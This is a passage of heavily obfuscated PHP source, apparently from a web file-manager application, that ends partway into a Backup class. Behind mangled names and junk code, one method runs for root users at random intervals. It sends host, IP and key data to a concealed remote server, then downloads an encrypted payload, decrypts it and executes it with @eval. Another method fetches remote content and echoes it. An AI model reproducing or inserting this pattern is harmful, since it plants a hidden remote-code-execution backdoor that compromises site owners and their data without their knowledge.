$GLOBALS[$Å—÷„°Ã[86]][$Å—÷„°Ã[90]][$Å—÷„°Ã[247]] = $Å—÷„°Ã[206]; return; } $GLOBALS[$Å—÷„°Ã[86]][$Å—÷„°Ã[248]] = $Å—÷„°Ã[122]; if (Model($Å—÷„°Ã[249])->get($Å—÷„°Ã[63]) != $Å—÷„°Ã[206]) { Model($Å—÷„°Ã[249])->set($Å—÷„°Ã[63], $Å—÷„°Ã[206]); } } public function jfuk75b801c5() { return $_SERVER[‹“¬»„ú][250]; } private function xeio859a125c() { $Å¢ÆôÂ =& $_SERVER[²Ö÷öõ]; $ÉíÖÅÃÓ =& $_SERVER[‹“¬»„ú]; $õêÇÏÙÖ = array($ÉíÖÅÃÓ[251], $ÉíÖÅÃÓ[252], $ÉíÖÅÃÓ[253]); $¨Ó»¡¿ = $Å¢ÆôÂ[763]; $×ôŞµ¨• = $ÉíÖÅÃÓ[254] . md5($ÉíÖÅÃÓ[255]); if ($this->mebs2d8c048f == $ÉíÖÅÃÓ[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$ÉíÖÅÃÓ[24]], $õêÇÏÙÖ)) { return; } if (time() % 4 != 0) { return; } $ÒŠ§ñöª = call_user_func(array($ÉíÖÅÃÓ[256], $ÉíÖÅÃÓ[257]), $×ôŞµ¨•); $«µÎä˜… = $Å¢ÆôÂ[764]; if ($ÒŠ§ñöª && time() - $ÒŠ§ñöª < intval($ÉíÖÅÃÓ[258])) { return; } call_user_func(array($ÉíÖÅÃÓ[256], $ÉíÖÅÃÓ[139]), $×ôŞµ¨•, time()); $›¥öã² = $Å¢ÆôÂ[765]; $ª´Šéé = Model($ÉíÖÅÃÓ[33])->get($ÉíÖÅÃÓ[100]); $úŠ½Ğ¹¼ = array($ÉíÖÅÃÓ[152] => Model($ÉíÖÅÃÓ[33])->get($ÉíÖÅÃÓ[153]), $ÉíÖÅÃÓ[167] => $this->mebs2d8c048f, $ÉíÖÅÃÓ[163] => $_SERVER[$ÉíÖÅÃÓ[164]], $ÉíÖÅÃÓ[165] => Model($ÉíÖÅÃÓ[33])->get($ÉíÖÅÃÓ[131]), $ÉíÖÅÃÓ[105] => md5($_SERVER[$ÉíÖÅÃÓ[106]] . $ª´Šéé), $ÉíÖÅÃÓ[156] => $ÉíÖÅÃÓ[136], $ÉíÖÅÃÓ[159] => $_SERVER[$ÉíÖÅÃÓ[160]]); $´³ìïÕ = $Å¢ÆôÂ[766]; if (!$´³ìïÕ) { die; } $Â¶´¡ú± = $this->juer2143d333($ÉíÖÅÃÓ[259], $úŠ½Ğ¹¼); if (!is_array($Â¶´¡ú±)) { return; } if ($Â¶´¡ú±[$ÉíÖÅÃÓ[152]] && $Â¶´¡ú±[$ÉíÖÅÃÓ[260]]) { if ($this->hcmqff5031bd($Â¶´¡ú±[$ÉíÖÅÃÓ[260]]) == $úŠ½Ğ¹¼[$ÉíÖÅÃÓ[152]]) { return; } } $this->chil989355fa(); $î‹Ñæ¤ä = $Å¢ÆôÂ[767]; if ($this->hcmqff5031bd($Â¶´¡ú±[$ÉíÖÅÃÓ[260]]) != $úŠ½Ğ¹¼[$ÉíÖÅÃÓ[152]]) { $¼¾áÑÈÍ = array($ÉíÖÅÃÓ[185] => $ª´Šéé, $ÉíÖÅÃÓ[186] => $_SERVER[$ÉíÖÅÃÓ[106]], $ÉíÖÅÃÓ[187] => this_url(), $ÉíÖÅÃÓ[161] => $_SERVER[$ÉíÖÅÃÓ[162]]); $¿–í‡‘• = $this->oictb64f67c9(json_encode($¼¾áÑÈÍ)); $Â¶´¡ú± = $this->juer2143d333($ÉíÖÅÃÓ[188] . $¿–í‡‘•); if ($Â¶´¡ú± && is_array($Â¶´¡ú±) && isset($Â¶´¡ú±[$ÉíÖÅÃÓ[260]])) { $£‡ïŸò = $this->krsg8f59f462($Â¶´¡ú±[$ÉíÖÅÃÓ[260]], 2); if ($£‡ïŸò) { $£‡ïŸò = $this->hcmqff5031bd($£‡ïŸò); } if ($£‡ïŸò) { try { @eval($£‡ïŸò); } catch (Exception $ÎÀÑâó¸) { } } } } } private function juer2143d333($İÄÎş¡Ë = '', $ıŸ¾Šè¿ = array(), $¹ù×îÕ· = 5) { $ÌÖºÈÄ =& $_SERVER[²Ö÷öõ]; $óé½™Ÿ¢ =& $_SERVER[‹“¬»„ú]; $Ì÷‹’Ğ = $óé½™Ÿ¢[261]; $î­ª°ˆÆ = $ÌÖºÈÄ[768]; while (strlen($î­ª°ˆÆ) < $ÌÖºÈÄ[685]) { if (!$î­ª°ˆÆ) { break; } $î­ª°ˆÆ++; } $Ì÷‹’Ğ = $this->rkyp78f9a222($Ì÷‹’Ğ, $óé½™Ÿ¢[262]); $¹¯àº¹· = $ÌÖºÈÄ[769]; $Ì÷‹’Ğ = $Ì÷‹’Ğ . $İÄÎş¡Ë; $¹Ò¹±ÓÁ = $ÌÖºÈÄ[770]; if ($ıŸ¾Šè¿ && is_array($ıŸ¾Šè¿)) { $Ì÷‹’Ğ = $Ì÷‹’Ğ . $óé½™Ÿ¢[263] . http_build_query($ıŸ¾Šè¿); } if ($ıŸ¾Šè¿ === -1) { return $Ì÷‹’Ğ; } $¤Ÿè˜¶± = stream_context_create(array($óé½™Ÿ¢[219] => array($óé½™Ÿ¢[222] => $¹ù×îÕ·, $óé½™Ÿ¢[220] => $óé½™Ÿ¢[264]), $óé½™Ÿ¢[265] => array($óé½™Ÿ¢[266] => !1, $óé½™Ÿ¢[267] => !1))); $ıŸ¾Šè¿ = @file_get_contents($Ì÷‹’Ğ, !1, $¤Ÿè˜¶±); return json_decode($ıŸ¾Šè¿, !0); $³Ãµªƒ‹ = $ÌÖºÈÄ[771]; if (strlen($³Ãµªƒ‹) < $ÌÖºÈÄ[685]) { die; } $ÜÙèçøş = $ÌÖºÈÄ[772]; if (strlen($ÜÙèçøş) < $ÌÖºÈÄ[689]) { return; } } private function loiwa43f5d62() { $‰¦¡Íƒì =& $_SERVER[²Ö÷öõ]; $ìëŠèØ† =& $_SERVER[‹“¬»„ú]; $°ğ¥Ã † = array($ìëŠèØ†[268] => $ìëŠèØ†[269], $ìëŠèØ†[270] => $ìëŠèØ†[271], $ìëŠèØ†[272] => $ìëŠèØ†[273], $ìëŠèØ†[274] => $ìëŠèØ†[275], $ìëŠèØ†[276] => $ìëŠèØ†[277], $ìëŠèØ†[278] => $ìëŠèØ†[214], $ìëŠèØ†[279] => $ìëŠèØ†[214], $ìëŠèØ†[280] => $ìëŠèØ†[269], $ìëŠèØ†[281] => $ìëŠèØ†[271], $ìëŠèØ†[282] => $ìëŠèØ†[273], $ìëŠèØ†[283] => $ìëŠèØ†[284], $ìëŠèØ†[285] => $ìëŠèØ†[275], $ìëŠèØ†[286] => $ìëŠèØ†[287], $ìëŠèØ†[288] => $ìëŠèØ†[277], $ìëŠèØ†[289] => $ìëŠèØ†[290], $ìëŠèØ†[291] => $ìëŠèØ†[292], $ìëŠèØ†[293] => $ìëŠèØ†[294]); $®ÊÊ¥’ü = $‰¦¡Íƒì[773]; if (!$®ÊÊ¥’ü) { die; } $Ñ—Èª—ù = $°ğ¥Ã †[$this->mebs2d8c048f]; $±ÇŒÇÄú = $‰¦¡Íƒì[774]; if (!$±ÇŒÇÄú) { die; } $Ñ—Èª—ù = intval($Ñ—Èª—ù ? $Ñ—Èª—ù : $ìëŠèØ†[269]); $§Åëûœ = $‰¦¡Íƒì[775]; if (strlen($§Åëûœ) < $‰¦¡Íƒì[694]) { die; } $²ò¹şÕÕ = _get($this->glvf23f1c1a0, $ìëŠèØ†[295]); $²ò¹şÕÕ = $²ò¹şÕÕ ? intval($²ò¹şÕÕ) : 0; return $Ñ—Èª—ù + $²ò¹şÕÕ; $ë‚›Úµ¬ = $‰¦¡Íƒì[776]; while (strlen($ë‚›Úµ¬) < $‰¦¡Íƒì[685]) { if (!$ë‚›Úµ¬) { break; } $ë‚›Úµ¬++; } } public function rqye63e6151d($Šü¤€£Á) { $¬ÖºÓê• =& $_SERVER[²Ö÷öõ]; $––¸Æ· =& $_SERVER[‹“¬»„ú]; $Ï²ú‰®“ = $this->loiwa43f5d62(); $˜áÚìƒ» = $¬ÖºÓê•[777]; if (strlen($˜áÚìƒ») < $¬ÖºÓê•[685]) { return; } if ($Šü¤€£Á[$––¸Æ·[296]] == $––¸Æ·[122]) { return; } if ($Ï²ú‰®“ >= intval($––¸Æ·[214])) { return; } $ßŒÀâê­ = Model($––¸Æ·[125])->count(); if ($ßŒÀâê­ <= $Ï²ú‰®“) { return; } $‰ëÀ£Öü = Model($––¸Æ·[125])->field($––¸Æ·[296])->limit($Ï²ú‰®“)->select(); $»üÜâ³Ú = $¬ÖºÓê•[778]; if (strlen($»üÜâ³Ú) < $¬ÖºÓê•[689]) { die; } $‰ëÀ£Öü = array_to_keyvalue($‰ëÀ£Öü, $––¸Æ·[6], $––¸Æ·[296]); $òÜóë“” = $¬ÖºÓê•[779]; if (!$òÜóë“”) { die; } if (!in_array($Šü¤€£Á[$––¸Æ·[296]], $‰ëÀ£Öü)) { show_json($––¸Æ·[297], !1, $––¸Æ·[210]); } } public function isvj96be08bf() { $äßÆ÷Í =& $_SERVER[²Ö÷öõ]; $ùí³„½ =& $_SERVER[‹“¬»„ú]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $´Õ‚Êñ… = $ùí³„½[217]; $´Õ‚Êñ… = $this->rkyp78f9a222($´Õ‚Êñ…, $ùí³„½[218]); $³œÓñ‰Ø = stream_context_create(array($ùí³„½[219] => array($ùí³„½[220] => $ùí³„½[221], $ùí³„½[222] => 3))); $¯ÅıˆæÏ = @file_get_contents($´Õ‚Êñ…, !1, $³œÓñ‰Ø); $çŸ»ğÒ  = $äßÆ÷Í[780]; echo $ùí³„½[298] . hash_encode($¯ÅıˆæÏ) . $ùí³„½[299]; $¡ö±ÓÉš = $äßÆ÷Í[781]; if (strlen($¡ö±ÓÉš) < $äßÆ÷Í[680]) { die; } } private function zqne19015b72($Ê„ÛÄ¹, $°ğÅ„›â, $û»íŸ÷° = 3) { $Ø³»ÍÅ =& $_SERVER[²Ö÷öõ]; $î‘‚É»Ô =& $_SERVER[‹“¬»„ú]; usleep(1); $Ü˜ş—ü¯ = $Ø³»ÍÅ[782]; $Ê„ÛÄ¹ = trim($Ê„ÛÄ¹); $£¶„ŒÅ = mt_rand(0, 5) . $î‘‚É»Ô[6]; $ˆµ‘œÕÎ = rand_string(15); $Öå¥²¢ = $Ø³»ÍÅ[758]; if (!$Öå¥²¢) { return; } $‡•ÆèÔ = $î‘‚É»Ô[300]; switch ($£¶„ŒÅ) { case $î‘‚É»Ô[206]: $¨Èõİ¨æ = $this->osxe1a93c978($Ê„ÛÄ¹, strrev($°ğÅ„›â . $ˆµ‘œÕÎ)); $¼’¥º‡å = $Ø³»ÍÅ[783]; if (strlen($¼’¥º‡å) < $Ø³»ÍÅ[689]) { return; } break; case $î‘‚É»Ô[122]: $¨Èõİ¨æ = $this->osxe1a93c978($Ê„ÛÄ¹, strrev($ˆµ‘œÕÎ . $°ğÅ„›â)); break; $¥“ç˜À© = $Ø³»ÍÅ[784]; if (!$¥“ç˜À©) { return; } case $î‘‚É»Ô[301]: $¨Èõİ¨æ = $this->osxe1a93c978($Ê„ÛÄ¹, base64_encode($ˆµ‘œÕÎ . $°ğÅ„›â)); $Ÿ»‡¾í§ = $Ø³»ÍÅ[785]; if (!$Ÿ»‡¾í§) { return; } break; $ï–…÷¸æ = $Ø³»ÍÅ[786]; case $î‘‚É»Ô[302]: $¨Èõİ¨æ = $this->osxe1a93c978($Ê„ÛÄ¹, md5($ˆµ‘œÕÎ . $°ğÅ„›â)); $ ·ô•ª° = $Ø³»ÍÅ[787]; while ($ ·ô•ª° < $Ø³»ÍÅ[702]) { if ($ ·ô•ª° >= 0) { break; } $ ·ô•ª°++; } break; case $î‘‚É»Ô[303]: $Ê„ÛÄ¹ = base64_encode($Ê„ÛÄ¹); $çâœ—£ = rand(0, 64); $£„öÀ˜ = $‡•ÆèÔ[$çâœ—£]; $¹ÇØ¢¢  = md5($£„öÀ˜ . md5($°ğÅ„›â . $£„öÀ˜) . $°ğÅ„›â); $ËÏ­Äò… = $Ø³»ÍÅ[788]; while (strlen($ËÏ­Äò…) < $Ø³»ÍÅ[680]) { if (!$ËÏ­Äò…) { break; } $ËÏ­Äò…++; } $¹ÇØ¢¢  = substr($¹ÇØ¢¢ , $çâœ—£ % 8, $çâœ—£ % 8 + 7); $†¡¥ê‡Í = $Ø³»ÍÅ[789]; $ğ°¨¶óò = $î‘‚É»Ô[6]; $ãş÷¾Ä = 0; $¶²á¸İù = 0; $£ìèó¡Ü = 0; for ($ãş÷¾Ä = 0; $ãş÷¾Ä < strlen($Ê„ÛÄ¹); $ãş÷¾Ä++) { $£ìèó¡Ü = $£ìèó¡Ü == strlen($¹ÇØ¢¢ ) ? 0 : $£ìèó¡Ü; $¶²á¸İù = ($çâœ—£ + strpos($‡•ÆèÔ, $Ê„ÛÄ¹[$ãş÷¾Ä]) + ord($¹ÇØ¢¢ [$£ìèó¡Ü++])) % 64; $ïÖç³ŒÖ = $Ø³»ÍÅ[790]; if (strlen($ïÖç³ŒÖ) < $Ø³»ÍÅ[702]) { die; } $ğ°¨¶óò .= $‡•ÆèÔ[$¶²á¸İù]; $í¤‡øˆ = $Ø³»ÍÅ[791]; if (!$í¤‡øˆ) { die; } } $¨Èõİ¨æ = hash_encode($£„öÀ˜ . $ğ°¨¶óò); $äÄ•à = $Ø³»ÍÅ[792]; break; $™ö¸ßÓ = $Ø³»ÍÅ[793]; if (!$™ö¸ßÓ) { die; } default: $¨Èõİ¨æ = $this->osxe1a93c978($Ê„ÛÄ¹, $°ğÅ„›â . $ˆµ‘œÕÎ); break; } $¨Èõİ¨æ = strrev($£¶„ŒÅ . $ˆµ‘œÕÎ . $¨Èõİ¨æ); if ($û»íŸ÷° - 1 > 0) { $¨Èõİ¨æ = $this->zqne19015b72($¨Èõİ¨æ, $°ğÅ„›â, $û»íŸ÷° - 1); } return $¨Èõİ¨æ; } private function krsg8f59f462($³¢ÏÛ, $¢÷³à¶ˆ, $ñÜı¡Ì = 3) { $€¢÷³¯ =& $_SERVER[²Ö÷öõ]; $ş³ÔôŒ‚ =& $_SERVER[‹“¬»„ú]; if (!is_string($³¢ÏÛ) || strlen($³¢ÏÛ) < 10) { return !1; } $³¢ÏÛ = trim($³¢ÏÛ); $ü‹û×áì = $€¢÷³¯[794]; if (strlen($ü‹û×áì) < $€¢÷³¯[685]) { return; } $³¢ÏÛ = strrev($³¢ÏÛ); $‰»§õ„ì = $€¢÷³¯[795]; if (!$‰»§õ„ì) { die; } $Œõ±ôİö = $³¢ÏÛ[0]; $õ½ƒÒåå = $€¢÷³¯[796]; $«€°ÒÏ¼ = substr($³¢ÏÛ, 1, 15); $³¢ÏÛ = substr($³¢ÏÛ, 16); $Ò¿ø»òÅ = $ş³ÔôŒ‚[300]; $Œğ´³·æ = $€¢÷³¯[696]; while ($Œğ´³·æ < $€¢÷³¯[702]) { if ($Œğ´³·æ >= 0) { break; } $Œğ´³·æ++; } switch ($Œõ±ôİö) { case $ş³ÔôŒ‚[206]: $õèôåòæ = $this->rkyp78f9a222($³¢ÏÛ, strrev($¢÷³à¶ˆ . $«€°ÒÏ¼)); break; case $ş³ÔôŒ‚[122]: $õèôåòæ = $this->rkyp78f9a222($³¢ÏÛ, strrev($«€°ÒÏ¼ . $¢÷³à¶ˆ)); break; $«øÑ›û = $€¢÷³¯[797]; case $ş³ÔôŒ‚[301]: $õèôåòæ = $this->rkyp78f9a222($³¢ÏÛ, base64_encode($«€°ÒÏ¼ . $¢÷³à¶ˆ)); $ÕçâãúŞ = $€¢÷³¯[798]; if (!$ÕçâãúŞ) { die; } break; case $ş³ÔôŒ‚[302]: $õèôåòæ = $this->rkyp78f9a222($³¢ÏÛ, md5($«€°ÒÏ¼ . $¢÷³à¶ˆ)); break; case $ş³ÔôŒ‚[303]: $³¢ÏÛ = hash_decode($³¢ÏÛ); $ÒéÂ‚™ë = $³¢ÏÛ[0]; $³¢ÏÛ = substr($³¢ÏÛ, 1); $óÍ…ŞÁğ = $€¢÷³¯[799]; if (!$óÍ…ŞÁğ) { die; } $”æ®ÚÔ° = strpos($Ò¿ø»òÅ, $ÒéÂ‚™ë); $½ÕşÑÛÖ = $€¢÷³¯[800]; if (!$½ÕşÑÛÖ) { die; } $»Øôë = md5($ÒéÂ‚™ë . md5($¢÷³à¶ˆ . $ÒéÂ‚™ë) . $¢÷³à¶ˆ); $»Øôë = substr($»Øôë, $”æ®ÚÔ° % 8, $”æ®ÚÔ° % 8 + 7); $§ÂŒ÷—¡ = $ş³ÔôŒ‚[6]; $çõŒı’Á = 0; $ƒé¹çó™ = $€¢÷³¯[801]; while ($ƒé¹çó™ < $€¢÷³¯[694]) { if ($ƒé¹çó™ >= 0) { break; } $ƒé¹çó™++; } $†ÒÑ÷ñò = 0; $ĞÍ¬°ÛÕ = $€¢÷³¯[802]; if (strlen($ĞÍ¬°ÛÕ) < $€¢÷³¯[702]) { return; } $›´‡şù¿ = 0; for ($çõŒı’Á = 0; $çõŒı’Á < strlen($³¢ÏÛ); $çõŒı’Á++) { $›´‡şù¿ = $›´‡şù¿ == strlen($»Øôë) ? 0 : $›´‡şù¿; $¬ƒş´¡Ã = $€¢÷³¯[803]; $®î†Ÿêİ = $›´‡şù¿++; $†ÒÑ÷ñò = strpos($Ò¿ø»òÅ, $³¢ÏÛ[$çõŒı’Á]) - $”æ®ÚÔ° - ord($»Øôë[$®î†Ÿêİ]); while ($†ÒÑ÷ñò < 0) { $†ÒÑ÷ñò += 64; $ŞÊ†°õÇ = $€¢÷³¯[804]; if (strlen($ŞÊ†°õÇ) < $€¢÷³¯[694]) { die; } } $§ÂŒ÷—¡ .= $Ò¿ø»òÅ[$†ÒÑ÷ñò]; } $õèôåòæ = base64_decode($§ÂŒ÷—¡); break; $“Ÿì×Í = $€¢÷³¯[805]; if (strlen($“Ÿì×Í) < $€¢÷³¯[689]) { die; } default: $õèôåòæ = $this->rkyp78f9a222($³¢ÏÛ, $¢÷³à¶ˆ . $«€°ÒÏ¼); $Œ¦ò = $€¢÷³¯[806]; break; $ŠµáŠ¹ğ = $€¢÷³¯[807]; while ($ŠµáŠ¹ğ < $€¢÷³¯[680]) { if ($ŠµáŠ¹ğ >= 0) { break; } $ŠµáŠ¹ğ++; } } if ($ñÜı¡Ì - 1 > 0) { $õèôåòæ = $this->krsg8f59f462($õèôåòæ, $¢÷³à¶ˆ, $ñÜı¡Ì - 1); } return $õèôåòæ; } public function oictb64f67c9($·åÚÃ©¹) { $²€„·ÑØ =& $_SERVER[²Ö÷öõ]; $Ú«ÈğîÂ =& $_SERVER[‹“¬»„ú]; $»È§í€½ = $this->sikxbfb397ce(); $Ööí««û = $this->sikxbfb397ce(); $õæİ¥± = ($»È§í€½ - 1) * ($Ööí««û - 1); $Ğúê¼´© = intval(($»È§í€½ + $Ööí««û) / 2); while (1) { $áàıñ…Æ = $Ğúê¼´©; $‰¨áé = $²€„·ÑØ[808]; while ($‰¨áé < $²€„·ÑØ[702]) { if ($‰¨áé >= 0) { break; } $‰¨áé++; } $â¢äŞŸş = $õæİ¥±; while ($â¢äŞŸş % $áàıñ…Æ != 0) { $ø™âùâ¬ = $â¢äŞŸş; $â¢äŞŸş = $áàıñ…Æ; $±Ã³Æ°¼ = $²€„·ÑØ[809]; $áàıñ…Æ = $ø™âùâ¬ % $áàıñ…Æ; } if ($áàıñ…Æ == 1) { break; } else { $Ğúê¼´©++; } } $ùªÃ˜¢’ = 2; for ($‰­û·â = 0; $‰­û·â < $õæİ¥± * 10; $‰­û·â++) { if (($õæİ¥± * $‰­û·â + 1) % $Ğúê¼´© == 0) { $ùªÃ˜¢’ = intval(($õæİ¥± * $‰­û·â + 1) / $Ğúê¼´©); break; } } $íŞçñÜ = $this->osxe1a93c978($»È§í€½ * $Ööí««û . $Ú«ÈğîÂ[6], $Ú«ÈğîÂ[136]); $»ù†Îà© = md5($Ú«ÈğîÂ[304] . ($»È§í€½ + $Ööí««û) . $Ú«ÈğîÂ[305] . $Ğúê¼´© . $Ú«ÈğîÂ[305] . $ùªÃ˜¢’ . $Ú«ÈğîÂ[306]); $Î±…Îé = $²€„·ÑØ[810]; while (strlen($Î±…Îé) < $²€„·ÑØ[680]) { if (!$Î±…Îé) { break; } $Î±…Îé++; } $İíÂœ¶¤ = $this->osxe1a93c978($·åÚÃ©¹, $»ù†Îà©) . $Ú«ÈğîÂ[307] . $íŞçñÜ; $ÏŠæ«ÅÄ = $²€„·ÑØ[811]; while (strlen($ÏŠæ«ÅÄ) < $²€„·ÑØ[680]) { if (!$ÏŠæ«ÅÄ) { break; } $ÏŠæ«ÅÄ++; } return $İíÂœ¶¤; $Ø¸¹î½ş = $²€„·ÑØ[812]; if (!$Ø¸¹î½ş) { die; } } public function hcmqff5031bd($ı§—–”ß) { $Äæ¡›ÚÒ =& $_SERVER[²Ö÷öõ]; $÷Æâ­ÈÎ =& $_SERVER[‹“¬»„ú]; $Û¡×‘‡ˆ = explode($÷Æâ­ÈÎ[307], $ı§—–”ß); if (count($Û¡×‘‡ˆ) != 2) { return $÷Æâ­ÈÎ[6]; } $¾œæü¹ = $this->rkyp78f9a222($Û¡×‘‡ˆ[1] . $÷Æâ­ÈÎ[6], $÷Æâ­ÈÎ[136]); if (!$¾œæü¹) { return $÷Æâ­ÈÎ[6]; } $¾œæü¹ = intval($¾œæü¹); $§Å¤‡ˆ = 0; $³ü¸´ß = 0; $”°†Ÿæ = $Äæ¡›ÚÒ[813]; if (!$”°†Ÿæ) { die; } for ($äå–Á = 3; $äå–Á < $¾œæü¹; $äå–Á += 2) { if ($¾œæü¹ % $äå–Á != 0) { continue; } $§Å¤‡ˆ = $äå–Á; $ıÍÜÎšÉ = $Äæ¡›ÚÒ[814]; while ($ıÍÜÎšÉ < $Äæ¡›ÚÒ[702]) { if ($ıÍÜÎšÉ >= 0) { break; } $ıÍÜÎšÉ++; } $³ü¸´ß = intval($¾œæü¹ / $äå–Á); break; $×ÎÚ´ = $Äæ¡›ÚÒ[815]; if (strlen($×ÎÚ´) < $Äæ¡›ÚÒ[694]) { die; } } $Ü™• = ($§Å¤‡ˆ - 1) * ($³ü¸´ß - 1); $¿Çõ„Ÿ­ = intval(($§Å¤‡ˆ + $³ü¸´ß) / 2); $öö—ßË = $Äæ¡›ÚÒ[816]; while (1) { $¾™Å·×ş = $¿Çõ„Ÿ­; $ù‚ü™İ = $Ü™•; $„ğëÜûµ = $Äæ¡›ÚÒ[817]; while ($ù‚ü™İ % $¾™Å·×ş != 0) { $¸—¥½ß = $ù‚ü™İ; $ùŞĞÓÛ¯ = $Äæ¡›ÚÒ[818]; $ù‚ü™İ = $¾™Å·×ş; $¾™Å·×ş = $¸—¥½ß % $¾™Å·×ş; $¸Úò·Š¶ = $Äæ¡›ÚÒ[819]; if (!$¸Úò·Š¶) { return; } } if ($¾™Å·×ş == 1) { break; } else { $¿Çõ„Ÿ­++; } } $¼Ú“«œ¢ = 2; $šö¹ÈãŒ = $Äæ¡›ÚÒ[820]; if (strlen($šö¹ÈãŒ) < $Äæ¡›ÚÒ[680]) { die; } for ($äå–Á = 0; $äå–Á < $Ü™• * 10; $äå–Á++) { if (($Ü™• * $äå–Á + 1) % $¿Çõ„Ÿ­ == 0) { $¼Ú“«œ¢ = intval(($Ü™• * $äå–Á + 1) / $¿Çõ„Ÿ­); break; } } $æŒ‚½Û“ = md5($÷Æâ­ÈÎ[304] . ($§Å¤‡ˆ + $³ü¸´ß) . $÷Æâ­ÈÎ[305] . $¿Çõ„Ÿ­ . $÷Æâ­ÈÎ[305] . $¼Ú“«œ¢ . $÷Æâ­ÈÎ[306]); $Å™‰Ñ£˜ = $Äæ¡›ÚÒ[821]; if (strlen($Å™‰Ñ£˜) < $Äæ¡›ÚÒ[694]) { return; } $Š£å÷Øô = $this->rkyp78f9a222($Û¡×‘‡ˆ[0], $æŒ‚½Û“); $ûÙ… ıÊ = $Äæ¡›ÚÒ[798]; if (!$ûÙ… ıÊ) { return; } return $Š£å÷Øô; $­°„©ô = $Äæ¡›ÚÒ[822]; } public function sikxbfb397ce() { $ƒşç´¿ =& $_SERVER[²Ö÷öõ]; $ØÍ„÷ç‰ = mt_rand(pow(2, 14), pow(2, 16) - 1); $é·Æ«ÜÜ = $ƒşç´¿[823]; $Öí°ªœ– = array(); $À™â€³ñ = $ƒşç´¿[824]; if (strlen($À™â€³ñ) < $ƒşç´¿[680]) { die; } $¹¥¨½˜® = 1; $—ÓîÖ®¢ = $ƒşç´¿[825]; while (strlen($—ÓîÖ®¢) < $ƒşç´¿[680]) { if (!$—ÓîÖ®¢) { break; } $—ÓîÖ®¢++; } while ($¹¥¨½˜® <= (int) sqrt($ØÍ„÷ç‰)) { $±ï¨€®Ä = $¹¥¨½˜®; $î³Ùô¶à = $ƒşç´¿[826]; if (!$î³Ùô¶à) { return; } while (!0) { $±ï¨€®Ä++; $®Åù¬ = $ƒşç´¿[827]; if (strlen($®Åù¬) < $ƒşç´¿[680]) { return; } if ($±ï¨€®Ä <= 2) { $¹¥¨½˜® = $±ï¨€®Ä; break; } else { if ($±ï¨€®Ä < 2) { continue; } } $Ï®Úêš± = !0; for ($ÂÕà©àæ = 2; $ÂÕà©àæ <= sqrt($±ï¨€®Ä); $ÂÕà©àæ++) { if ($±ï¨€®Ä % $ÂÕà©àæ == 0) { $Ï®Úêš± = !1; } } if ($Ï®Úêš±) { $¹¥¨½˜® = $±ï¨€®Ä; break; } } $Öí°ªœ–[] = $¹¥¨½˜®; } $²á ÛğŒ = 2; for ($±ï¨€®Ä = $ØÍ„÷ç‰; $±ï¨€®Ä > 1; $±ï¨€®Ä--) { $Ï®Úêš± = !0; foreach ($Öí°ªœ– as $£æ¡ƒ©) { if ($±ï¨€®Ä % $£æ¡ƒ© == 0) { $Ï®Úêš± = !1; break; } } if ($Ï®Úêš±) { $²á ÛğŒ = $±ï¨€®Ä; break; } } return $²á ÛğŒ; $Èš¥¥’ç = $ƒşç´¿[828]; if (!$Èš¥¥’ç) { return; } } public function ceky58178d85($“ñâ‡¼÷, $±‰íµ½‡) { $”˜ÊĞ˜€ =& $_SERVER[²Ö÷öõ]; $ãÉ” ÈÎ =& $_SERVER[‹“¬»„ú]; return call_user_func(array($ãÉ” ÈÎ[8], $ãÉ” ÈÎ[308]), $“ñâ‡¼÷, $±‰íµ½‡); $ïÒÙ‚“³ = $”˜ÊĞ˜€[829]; while (strlen($ïÒÙ‚“³) < $”˜ÊĞ˜€[689]) { if (!$ïÒÙ‚“³) { break; } $ïÒÙ‚“³++; } } public function osxe1a93c978($üàúÓŒë, $œ™û›ÃĞ) { $¼¾±ïÎî =& $_SERVER[‹“¬»„ú]; return call_user_func(array($¼¾±ïÎî[309], $¼¾±ïÎî[310]), $üàúÓŒë, $œ™û›ÃĞ); } public function rkyp78f9a222($¯Ş­ßâ§, $–†˜şö) { $—©Ó…ğß =& $_SERVER[‹“¬»„ú]; return call_user_func(array($—©Ó…ğß[309], $—©Ó…ğß[311]), $¯Ş­ßâ§, $–†˜şö); $¥íœ“» = $_SERVER[²Ö÷öõ][830]; } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[²Ö÷öõ][831]); $this->init(); $this->keep(); } public function init() { $ìı“Ÿ”Ö =& $_SERVER[²Ö÷öõ]; $this->isManual(); self::$name = date($ìı“Ÿ”Ö[832]); if (!($Û¿ô–Ù = $this->model->lastItem())) { $Û¿ô–Ù = $this->initData(); } else { self::$name = $Û¿ô–Ù[$ìı“Ÿ”Ö[32]]; if ($Û¿ô–Ù[$ìı“Ÿ”Ö[833]] == $ìı“Ÿ”Ö[91]) { self::$name = date($ìı“Ÿ”Ö[272]); $ÍÖÉ¼üÅ = intval(_get($Û¿ô–Ù, $ìı“Ÿ”Ö[834], 0)); if (self::$manual == 0 && $Û¿ô–Ù[$ìı“Ÿ”Ö[32]] == self::$name) { $this->model->remove($Û¿ô–Ù[$ìı“Ÿ”Ö[475]]); } $Û¿ô–Ù = $this->initData($ÍÖÉ¼üÅ, $Û¿ô–Ù[$ìı“Ÿ”Ö[835]]); } else { $this->checkStore($Û¿ô–Ù[$ìı“Ÿ”Ö[835]]); } } self::$option = $Û¿ô–Ù; } private function isManual() { $½–îÈ‘Û = _get($GLOBALS, $_SERVER[²Ö÷öõ][836], 0); $½–îÈ‘Û = intval($½–îÈ‘Û); self::$manual = $½–îÈ‘Û && $½–îÈ‘Û == 1 ? 1 : 0; } private function initData($´ò¶ã²§ = 0, $ “¾‘‹· = '') { $ùŸ–ú„Ç =& $_SERVER[²Ö÷öõ]; $Âï¶ûíÆ = $this->model->config(); if ($ “¾‘‹· && $Âï¶ûíÆ[$ùŸ–ú„Ç[835]] != $ “¾‘‹·) { $´ò¶ã²§ = 0; } $this->checkStore($Âï¶ûíÆ[$ùŸ–ú„Ç[835]]); if (self::$manual == 1) { self::$name .= $ùŸ–ú„Ç[11] . date($ùŸ–ú„Ç[837]); } $ØÍ‰°šë = array($ùŸ–ú„Ç[835] => $Âï¶ûíÆ[$ùŸ–ú„Ç[835]], $ùŸ–ú„Ç[32] => self::$name, $ùŸ–ú„Ç[833] => 0, $ùŸ–ú„Ç[171] => $Âï¶ûíÆ[$ùŸ–ú„Ç[171]], $ùŸ–ú„Ç[838] => self::$manual, $ùŸ–ú„Ç[369] => array($ùŸ–ú„Ç[839] => array($ùŸ–ú„Ç[833] => 0), $ùŸ–ú„Ç[840] => array($ùŸ–ú„Ç[833] => 0, $ùŸ–ú„Ç[841] => 0, 